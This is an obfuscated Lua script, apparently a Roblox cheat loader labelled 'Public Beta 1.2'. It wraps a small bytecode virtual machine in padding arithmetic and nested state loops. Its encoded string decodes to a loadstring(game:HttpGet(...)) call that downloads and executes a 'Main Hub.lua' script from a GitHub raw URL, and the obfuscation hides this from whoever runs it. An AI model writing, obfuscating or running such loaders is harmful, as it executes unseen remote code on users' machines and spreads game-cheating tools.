print("Loading Public Beta 1.2")

local v0 = tonumber
local v1 = string.byte
local v2 = string.char
local v3 = string.sub
local v4 = string.gsub
local v5 = string.rep
local v6 = table.concat
local v7 = table.insert
local v8 = math.ldexp
local v9 = getfenv or function()
        return _ENV
    end
local v10 = setmetatable
local v11 = pcall
local v12 = select
local v13 = unpack or table.unpack
local v14 = tonumber
local function v15(v16, v17, ...)
    local v18 = 1
    local v19
    v16 =
        v4(
        v3(v16, 5),
        "..",
        function(v30)
            if (v1(v30, 2) == 79) then
                local v83 = 0
                while true do
                    if (v83 == 0) then
                        v19 = v0(v3(v30, 1, 1))
                        return ""
                    end
                end
            else
                local v84 = v2(v0(v30, 16))
                if v19 then
                    local v91 = v5(v84, v19)
                    v19 = nil
                    return v91
                else
                    return v84
                end
            end
        end
    )
    local function v20(v31, v32, v33)
        if v33 then
            local v85 =
                (v31 / (((882 - (282 + 595)) - 3) ^ (v32 - (2 - (1638 - (1523 + 114)))))) %
                (2 ^ (((v33 - (1 - 0)) - (v32 - 1)) + (2 - 1)))
            return v85 - (v85 % (620 - (555 + 58 + 6)))
        else
            local v86 = (1326 - 395) - ((1922 - (68 + 997)) + 74)
            local v87
            while true do
                if (v86 == 0) then
                    v87 = ((1840 - (226 + 1044)) - (367 + 201)) ^ (v32 - (928 - (214 + 713)))
                    return (((v31 % (v87 + v87)) >= v87) and (1 + 0)) or (0 + 0)
                end
            end
        end
    end
    local function v21()
        local v34 = 0 - 0
        local v35
        while true do
            if (v34 == ((1075 - (892 + 65)) - (32 + 85))) then
                return v35
            end
            if (v34 == (0 + 0)) then
                v35 = v1(v16, v18, v18)
                v18 = v18 + 1 + 0
                v34 = 1
            end
        end
    end
    local function v22()
        local v36 = 0
        local v37
        local v38
        while true do
            if (v36 == ((0 - 0) - 0)) then
                v37, v38 = v1(v16, v18, v18 + (3 - 1))
                v18 = v18 + ((3 + 0) - 1)
                v36 = 351 - (87 + (1045 - 782))
            end
            if (v36 == (181 - (67 + 113))) then
                return (v38 * (188 + 68)) + v37
            end
        end
    end
    local function v23()
        local v39, v40, v41, v42 = v1(v16, v18, v18 + (955 - (802 + 150)))
        v18 = v18 + ((28 - 18) - 6)
        return (v42 * (30433252 - 13656036)) + (v41 * (27790 + 19913 + 17833)) + (v40 * (1253 - (915 + 82))) + v39
    end
    local function v24()
        local v43 = 0 - 0
        local v44
        local v45
        local v46
        local v47
        local v48
        local v49
        while true do
            if (v43 == 3) then
                if (v48 == (1187 - (1069 + 118))) then
                    if (v47 == 0) then
                        return v49 * (0 - 0)
                    else
                        v48 = 1 - (0 - 0)
                        v46 = 0 + 0
                    end
                elseif (v48 == 2047) then
                    return ((v47 == 0) and (v49 * (1 / (0 - 0)))) or (v49 * NaN)
                end
                return v8(v49, v48 - (1015 + 8)) * (v46 + (v47 / (2 ^ (843 - (368 + 423)))))
            end
            if (v43 == (3 - 2)) then
                v46 = 19 - (10 + 8)
                v47 = (v20(v45, 3 - 2, 462 - (416 + (92 - 66))) * ((6 - 4) ^ ((873 - (814 + 45)) + 18))) + v44
                v43 = 3 - 1
            end
            if (v43 == (440 - (145 + 293))) then
                v48 = v20(v45, 451 - (44 + 386), 1517 - (998 + 488))
                v49 = ((v20(v45, 32) == (1 + 0)) and -((2 - 1) + 0)) or (773 - (201 + 31 + 540))
                v43 = 1141 - (116 + 1022)
            end
            if (v43 == (0 - 0)) then
                v44 = v23()
                v45 = v23()
                v43 = 1 + 0 + 0
            end
        end
    end
    local function v25(v50)
        local v51
        if not v50 then
            v50 = v23()
            if (v50 == (1080 - (1020 + 60))) then
                return ""
            end
        end
        v51 = v3(v16, v18, (v18 + v50) - (886 - (261 + 624)))
        v18 = v18 + v50
        local v52 = {}
        for v67 = 1 - 0, #v51 do
            v52[v67] = v2(v1(v3(v51, v67, v67)))
        end
        return v6(v52)
    end
    local v26 = v23
    local function v27(...)
        return {...}, v12("#", ...)
    end
    local function v28()
        local v53 = 0 + 0
        local v54
        local v55
        local v56
        local v57
        local v58
        local v59
        local v60
        while true do
            if (v53 == 2) then
                v58 = nil
                v59 = nil
                v53 = 6 - 3
            end
            if (3 ~= v53) then
            else
                v60 = nil
                while true do
                    local v92 = 0
                    while true do
                        if (v92 == 0) then
                            if (v54 == (0 - 0)) then
                                local v118 = 0
                                while true do
                                    if (v118 == (2 - 0)) then
                                        v54 = 2 - 1
                                        break
                                    end
                                    if (v118 == (286 - (134 + 151))) then
                                        v57 = {}
                                        v58 = {v55, v56, nil, v57}
                                        v118 = 1667 - (970 + 695)
                                    end
                                    if (v118 == (0 - 0)) then
                                        v55 = {}
                                        v56 = {}
                                        v118 = 1
                                    end
                                end
                            end
                            if (v54 == (1992 - (582 + 1408))) then
                                for v122 = 1, v23() do
                                    local v123 = 0 - 0
                                    local v124
                                    local v125
                                    local v126
                                    local v127
                                    while true do
                                        if (v123 == (2 - 0)) then
                                            while true do
                                                if (v124 ~= 0) then
                                                else
                                                    local v160 = 0 - 0
                                                    while true do
                                                        if (v160 ~= 0) then
                                                        else
                                                            v125 = 0
                                                            v126 = nil
                                                            v160 = 1825 - (1195 + 629)
                                                        end
                                                        if (v160 ~= (1 - 0)) then
                                                        else
                                                            v124 = 242 - (187 + 54)
                                                            break
                                                        end
                                                    end
                                                end
                                                if (v124 == 1) then
                                                    v127 = nil
                                                    while true do
                                                        if (v125 == 0) then
                                                            local v163 = 0
                                                            while true do
                                                                if (v163 == (780 - (162 + 618))) then
                                                                    local v164 = 0 + 0
                                                                    while true do
                                                                        if (v164 ~= (0 + 0)) then
                                                                        else
                                                                            v126 = 0
                                                                            v127 = nil
                                                                            v164 = 1 - 0
                                                                        end
                                                                        if (v164 ~= (1 - 0)) then
                                                                        else
                                                                            v163 = 1
                                                                            break
                                                                        end
                                                                    end
                                                                end
                                                                if (v163 == 1) then
                                                                    v125 = 1 + 0
                                                                    break
                                                                end
                                                            end
                                                        end
                                                        if (v125 == 1) then
                                                            while true do
                                                                if (v126 == (1636 - (1373 + 263))) then
                                                                    v127 = v21()
                                                                    if (v20(v127, 1001 - (451 + 549), 1 + 0) == 0) then
                                                                        local v165 = 0
                                                                        local v166
                                                                        local v167
                                                                        local v168
                                                                        local v169
                                                                        local v170
                                                                        while true do
                                                                            if (v165 == 1) then
                                                                                v168 = nil
                                                                                v169 = nil
                                                                                v165 = 2 - 0
                                                                            end
                                                                            if (v165 ~= (2 - 0)) then
                                                                            else
                                                                                v170 = nil
                                                                                while true do
                                                                                    if (1 == v166) then
                                                                                        local v171 = 1384 - (746 + 638)
                                                                                        while true do
                                                                                            if (v171 == 1) then
                                                                                                v166 = 2
                                                                                                break
                                                                                            end
                                                                                            if (v171 ~= 0) then
                                                                                            else
                                                                                                v169 = nil
                                                                                                v170 = nil
                                                                                                v171 = 1
                                                                                            end
                                                                                        end
                                                                                    end
                                                                                    if ((1 + 1) == v166) then
                                                                                        while true do
                                                                                            if (v167 == (4 - 1)) then
                                                                                                if
                                                                                                    (v20(
                                                                                                        v169,
                                                                                                        344 -
                                                                                                            (218 + 123),
                                                                                                        3
                                                                                                    ) == 1)
                                                                                                 then
                                                                                                    v170[
                                                                                                            1585 -
                                                                                                                (1535 +
                                                                                                                    46)
                                                                                                        ] =
                                                                                                        v60[v170[4 + 0]]
                                                                                                end
                                                                                                v55[v122] = v170
                                                                                                break
                                                                                            end
                                                                                            if (v167 ~= (1 + 0)) then
                                                                                            else
                                                                                                local v173 =
                                                                                                    560 - (306 + 254)
                                                                                                local v174
                                                                                                while true do
                                                                                                    if (v173 == 0) then
                                                                                                        v174 = 0
                                                                                                        while true do
                                                                                                            if
                                                                                                                (v174 ~=
                                                                                                                    0)
                                                                                                             then
                                                                                                            else
                                                                                                                local v181 =
                                                                                                                    0
                                                                                                                while true do
                                                                                                                    if
                                                                                                                        (v181 ~=
                                                                                                                            1)
                                                                                                                     then
                                                                                                                    else
                                                                                                                        v174 =
                                                                                                                            1 +
                                                                                                                            0
                                                                                                                        break
                                                                                                                    end
                                                                                                                    if
                                                                                                                        (v181 ~=
                                                                                                                            (0 -
                                                                                                                                0))
                                                                                                                     then
                                                                                                                    else
                                                                                                                        v170 = {
                                                                                                                            v22(

                                                                                                                            ),
                                                                                                                            v22(

                                                                                                                            ),
                                                                                                                            nil,
                                                                                                                            nil
                                                                                                                        }
                                                                                                                        if
                                                                                                                            (v168 ==
                                                                                                                                0)
                                                                                                                         then
                                                                                                                            local v186 =
                                                                                                                                0 -
                                                                                                                                0
                                                                                                                            local v187
                                                                                                                            while true do
                                                                                                                                if
                                                                                                                                    (v186 ==
                                                                                                                                        0)
                                                                                                                                 then
                                                                                                                                    v187 =
                                                                                                                                        0
                                                                                                                                    while true do
                                                                                                                                        if
                                                                                                                                            (v187 ==
                                                                                                                                                (603 -
                                                                                                                                                    (268 +
                                                                                                                                                        335)))
                                                                                                                                         then
                                                                                                                                            v170[
                                                                                                                                                    293 -
                                                                                                                                                        (60 +
                                                                                                                                                            230)
                                                                                                                                                ] =
                                                                                                                                                v22(

                                                                                                                                            )
                                                                                                                                            v170[
                                                                                                                                                    576 -
                                                                                                                                                        (426 +
                                                                                                                                                            146)
                                                                                                                                                ] =
                                                                                                                                                v22(

                                                                                                                                            )
                                                                                                                                            break
                                                                                                                                        end
                                                                                                                                    end
                                                                                                                                    break
                                                                                                                                end
                                                                                                                            end
                                                                                                                        elseif
                                                                                                                            (v168 ==
                                                                                                                                (1 +
                                                                                                                                    0))
                                                                                                                         then
                                                                                                                            v170[
                                                                                                                                    3
                                                                                                                                ] =
                                                                                                                                v23(

                                                                                                                            )
                                                                                                                        elseif
                                                                                                                            (v168 ==
                                                                                                                                2)
                                                                                                                         then
                                                                                                                            v170[
                                                                                                                                    1459 -
                                                                                                                                        (282 +
                                                                                                                                            1174)
                                                                                                                                ] =
                                                                                                                                v23(

                                                                                                                            ) -
                                                                                                                                (2 ^
                                                                                                                                    (827 -
                                                                                                                                        (569 +
                                                                                                                                            242)))
                                                                                                                        elseif
                                                                                                                            (v168 ==
                                                                                                                                (8 -
                                                                                                                                    5))
                                                                                                                         then
                                                                                                                            local v192 =
                                                                                                                                0
                                                                                                                            local v193
                                                                                                                            local v194
                                                                                                                            while true do
                                                                                                                                if
                                                                                                                                    (v192 ==
                                                                                                                                        (0 +
                                                                                                                                            0))
                                                                                                                                 then
                                                                                                                                    v193 =
                                                                                                                                        0
                                                                                                                                    v194 =
                                                                                                                                        nil
                                                                                                                                    v192 =
                                                                                                                                        1025 -
                                                                                                                                        (706 +
                                                                                                                                            318)
                                                                                                                                end
                                                                                                                                if
                                                                                                                                    ((1252 -
                                                                                                                                        (721 +
                                                                                                                                            530)) ~=
                                                                                                                                        v192)
                                                                                                                                 then
                                                                                                                                else
                                                                                                                                    while true do
                                                                                                                                        if
                                                                                                                                            (v193 ==
                                                                                                                                                (1271 -
                                                                                                                                                    (945 +
                                                                                                                                                        326)))
                                                                                                                                         then
                                                                                                                                            v194 =
                                                                                                                                                0 -
                                                                                                                                                0
                                                                                                                                            while true do
                                                                                                                                                if
                                                                                                                                                    (v194 ==
                                                                                                                                                        (0 +
                                                                                                                                                            0))
                                                                                                                                                 then
                                                                                                                                                    v170[
                                                                                                                                                            703 -
                                                                                                                                                                (271 +
                                                                                                                                                                    429)
                                                                                                                                                        ] =
                                                                                                                                                        v23(

                                                                                                                                                    ) -
                                                                                                                                                        (2 ^
                                                                                                                                                            (15 +
                                                                                                                                                                1))
                                                                                                                                                    v170[
                                                                                                                                                            1504 -
                                                                                                                                                                (1408 +
                                                                                                                                                                    92)
                                                                                                                                                        ] =
                                                                                                                                                        v22(

                                                                                                                                                    )
                                                                                                                                                    break
                                                                                                                                                end
                                                                                                                                            end
                                                                                                                                            break
                                                                                                                                        end
                                                                                                                                    end
                                                                                                                                    break
                                                                                                                                end
                                                                                                                            end
                                                                                                                        end
                                                                                                                        v181 =
                                                                                                                            1
                                                                                                                    end
                                                                                                                end
                                                                                                            end
                                                                                                            if
                                                                                                                (v174 ~=
                                                                                                                    (1087 -
                                                                                                                        (461 +
                                                                                                                            625)))
                                                                                                             then
                                                                                                            else
                                                                                                                v167 = 2
                                                                                                                break
                                                                                                            end
                                                                                                        end
                                                                                                        break
                                                                                                    end
                                                                                                end
                                                                                            end
                                                                                            if (v167 ~= 2) then
                                                                                            else
                                                                                                local v175 =
                                                                                                    1288 - (993 + 295)
                                                                                                local v176
                                                                                                while true do
                                                                                                    if (v175 == (0 + 0)) then
                                                                                                        v176 = 0
                                                                                                        while true do
                                                                                                            if
                                                                                                                (v176 ==
                                                                                                                    (1171 -
                                                                                                                        (418 +
                                                                                                                            753)))
                                                                                                             then
                                                                                                                if
                                                                                                                    (v20(
                                                                                                                        v169,
                                                                                                                        1 +
                                                                                                                            0,
                                                                                                                        1 +
                                                                                                                            0
                                                                                                                    ) ~=
                                                                                                                        1)
                                                                                                                 then
                                                                                                                else
                                                                                                                    v170[
                                                                                                                            1 +
                                                                                                                                1
                                                                                                                        ] =
                                                                                                                        v60[
                                                                                                                        v170[
                                                                                                                            1 +
                                                                                                                                1
                                                                                                                        ]
                                                                                                                    ]
                                                                                                                end
                                                                                                                if
                                                                                                                    (v20(
                                                                                                                        v169,
                                                                                                                        531 -
                                                                                                                            (406 +
                                                                                                                                123),
                                                                                                                        1771 -
                                                                                                                            (1749 +
                                                                                                                                20)
                                                                                                                    ) ==
                                                                                                                        1)
                                                                                                                 then
                                                                                                                    v170[
                                                                                                                            3
                                                                                                                        ] =
                                                                                                                        v60[
                                                                                                                        v170[
                                                                                                                            1 +
                                                                                                                                2
                                                                                                                        ]
                                                                                                                    ]
                                                                                                                end
                                                                                                                v176 =
                                                                                                                    1323 -
                                                                                                                    (1249 +
                                                                                                                        73)
                                                                                                            end
                                                                                                            if
                                                                                                                (v176 ==
                                                                                                                    (1 +
                                                                                                                        0))
                                                                                                             then
                                                                                                                v167 = 3
                                                                                                                break
                                                                                                            end
                                                                                                        end
                                                                                                        break
                                                                                                    end
                                                                                                end
                                                                                            end
                                                                                            if
                                                                                                (v167 ==
                                                                                                    (1145 - (466 + 679)))
                                                                                             then
                                                                                                local v177 = 0
                                                                                                local v178
                                                                                                while true do
                                                                                                    if (v177 == (0 - 0)) then
                                                                                                        v178 = 0
                                                                                                        while true do
                                                                                                            if
                                                                                                                (1 ==
                                                                                                                    v178)
                                                                                                             then
                                                                                                                v167 =
                                                                                                                    2 -
                                                                                                                    1
                                                                                                                break
                                                                                                            end
                                                                                                            if
                                                                                                                (v178 ==
                                                                                                                    (1900 -
                                                                                                                        (106 +
                                                                                                                            1794)))
                                                                                                             then
                                                                                                                v168 =
                                                                                                                    v20(
                                                                                                                    v127,
                                                                                                                    2,
                                                                                                                    1 +
                                                                                                                        2
                                                                                                                )
                                                                                                                v169 =
                                                                                                                    v20(
                                                                                                                    v127,
                                                                                                                    2 +
                                                                                                                        2,
                                                                                                                    17 -
                                                                                                                        11
                                                                                                                )
                                                                                                                v178 =
                                                                                                                    2 -
                                                                                                                    1
                                                                                                            end
                                                                                                        end
                                                                                                        break
                                                                                                    end
                                                                                                end
                                                                                            end
                                                                                        end
                                                                                        break
                                                                                    end
                                                                                    if (v166 == 0) then
                                                                                        v167 = 114 - (4 + 110)
                                                                                        v168 = nil
                                                                                        v166 = 1
                                                                                    end
                                                                                end
                                                                                break
                                                                            end
                                                                            if (v165 ~= 0) then
                                                                            else
                                                                                v166 = 584 - (57 + 527)
                                                                                v167 = nil
                                                                                v165 = 1428 - (41 + 1386)
                                                                            end
                                                                        end
                                                                    end
                                                                    break
                                                                end
                                                            end
                                                            break
                                                        end
                                                    end
                                                    break
                                                end
                                            end
                                            break
                                        end
                                        if (v123 == 1) then
                                            v126 = nil
                                            v127 = nil
                                            v123 = 105 - (17 + 86)
                                        end
                                        if (v123 == (0 + 0)) then
                                            v124 = 0
                                            v125 = nil
                                            v123 = 1
                                        end
                                    end
                                end
                                for v128 = 1 - 0, v23() do
                                    v56[v128 - (2 - 1)] = v28()
                                end
                                return v58
                            end
                            v92 = 1
                        end
                        if (v92 ~= (167 - (122 + 44))) then
                        else
                            if (v54 == 1) then
                                v59 = v23()
                                v60 = {}
                                for v130 = 1 - 0, v59 do
                                    local v131 = 0 - 0
                                    local v132
                                    local v133
                                    local v134
                                    while true do
                                        if ((1 + 0) == v131) then
                                            v134 = nil
                                            while true do
                                                if (v132 == 1) then
                                                    if (v133 == (1 + 0)) then
                                                        v134 = v21() ~= (0 - 0)
                                                    elseif (v133 == 2) then
                                                        v134 = v24()
                                                    elseif (v133 ~= (68 - (30 + 35))) then
                                                    else
                                                        v134 = v25()
                                                    end
                                                    v60[v130] = v134
                                                    break
                                                end
                                                if (v132 ~= 0) then
                                                else
                                                    local v162 = 0 + 0
                                                    while true do
                                                        if (v162 == (1258 - (1043 + 214))) then
                                                            v132 = 3 - 2
                                                            break
                                                        end
                                                        if (v162 ~= 0) then
                                                        else
                                                            v133 = v21()
                                                            v134 = nil
                                                            v162 = 1213 - (323 + 889)
                                                        end
                                                    end
                                                end
                                            end
                                            break
                                        end
                                        if (v131 ~= 0) then
                                        else
                                            v132 = 0
                                            v133 = nil
                                            v131 = 1
                                        end
                                    end
                                end
                                v58[7 - 4] = v21()
                                v54 = 582 - (361 + 219)
                            end
                            break
                        end
                    end
                end
                break
            end
            if (v53 ~= (321 - (53 + 267))) then
            else
                v56 = nil
                v57 = nil
                v53 = 1 + 1
            end
            if (v53 == 0) then
                v54 = 413 - (15 + 398)
                v55 = nil
                v53 = 983 - (18 + 964)
            end
        end
    end
    local function v29(v61, v62, v63)
        local v64 = v61[1]
        local v65 = v61[2]
        local v66 = v61[3]
        return function(...)
            local v69 = v64
            local v70 = v65
            local v71 = v66
            local v72 = v27
            local v73 = 1
            local v74 = -1
            local v75 = {}
            local v76 = {...}
            local v77 = v12("#", ...) - 1
            local v78 = {}
            local v79 = {}
            for v88 = 0, v77 do
                if (v88 >= v71) then
                    v75[v88 - v71] = v76[v88 + 1]
                else
                    v79[v88] = v76[v88 + 1]
                end
            end
            local v80 = (v77 - v71) + 1
            local v81
            local v82
            while true do
                v81 = v69[v73]
                v82 = v81[1]
                if (v82 <= 3) then
                    if (v82 <= 1) then
                        if (v82 == 0) then
                            v79[v81[2]]()
                        else
                            do
                                return
                            end
                        end
                    elseif (v82 == 2) then
                        local v97 = v81[2]
                        local v98 = v79[v81[3]]
                        v79[v97 + 1] = v98
                        v79[v97] = v98[v81[4]]
                    else
                        local v102 = 0
                        local v103
                        local v104
                        local v105
                        local v106
                        local v107
                        while true do
                            if (0 == v102) then
                                v103 = nil
                                v104, v105 = nil
                                v106 = nil
                                v107 = nil
                                v102 = 1
                            end
                            if (v102 == 2) then
                                v73 = v73 + 1
                                v81 = v69[v73]
                                v107 = v81[2]
                                v106 = v79[v81[3]]
                                v102 = 3
                            end
                            if (4 == v102) then
                                v79[v81[2]] = v81[3]
                                v73 = v73 + 1
                                v81 = v69[v73]
                                v107 = v81[2]
                                v102 = 5
                            end
                            if (v102 == 3) then
                                v79[v107 + 1] = v106
                                v79[v107] = v106[v81[4]]
                                v73 = v73 + 1
                                v81 = v69[v73]
                                v102 = 4
                            end
                            if (v102 == 1) then
                                v79[v81[2]] = v63[v81[3]]
                                v73 = v73 + 1
                                v81 = v69[v73]
                                v79[v81[2]] = v63[v81[3]]
                                v102 = 2
                            end
                            if (6 == v102) then
                                v73 = v73 + 1
                                v81 = v69[v73]
                                v107 = v81[2]
                                v79[v107] = v79[v107](v13(v79, v107 + 1, v74))
                                v102 = 7
                            end
                            if (v102 == 7) then
                                v73 = v73 + 1
                                v81 = v69[v73]
                                v79[v81[2]]()
                                v73 = v73 + 1
                                v102 = 8
                            end
                            if (v102 == 5) then
                                v104, v105 = v72(v79[v107](v13(v79, v107 + 1, v81[3])))
                                v74 = (v105 + v107) - 1
                                v103 = 0
                                for v154 = v107, v74 do
                                    local v155 = 0
                                    while true do
                                        if (v155 == 0) then
                                            v103 = v103 + 1
                                            v79[v154] = v104[v103]
                                            break
                                        end
                                    end
                                end
                                v102 = 6
                            end
                            if (v102 == 8) then
                                v81 = v69[v73]
                                do
                                    return
                                end
                                break
                            end
                        end
                    end
                elseif (v82 <= 5) then
                    if (v82 == 4) then
                        v79[v81[2]] = v81[3]
                    else
                        v79[v81[2]] = v63[v81[3]]
                    end
                elseif (v82 > 6) then
                    local v112 = v81[2]
                    local v113, v114 = v72(v79[v112](v13(v79, v112 + 1, v81[3])))
                    v74 = (v114 + v112) - 1
                    local v115 = 0
                    for v120 = v112, v74 do
                        local v121 = 0
                        while true do
                            if (v121 == 0) then
                                v115 = v115 + 1
                                v79[v120] = v113[v115]
                                break
                            end
                        end
                    end
                else
                    local v116 = v81[2]
                    v79[v116] = v79[v116](v13(v79, v116 + 1, v74))
                end
                v73 = v73 + 1
            end
        end
    end
    return v29(v28(), {}, v17)(...)
end
return v15(
    "LOL!043O00030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574035D3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F536B69646F4C4F4C2F417273656E616C5363726970742F6D61696E2F417273656E616C2532305363726970742F4D61696E2532304875622E6C756100083O0012033O00013O00122O000100023O00202O00010001000300122O000300046O000100039O0000026O000100016O00017O00",
    v9(),
    ...
)
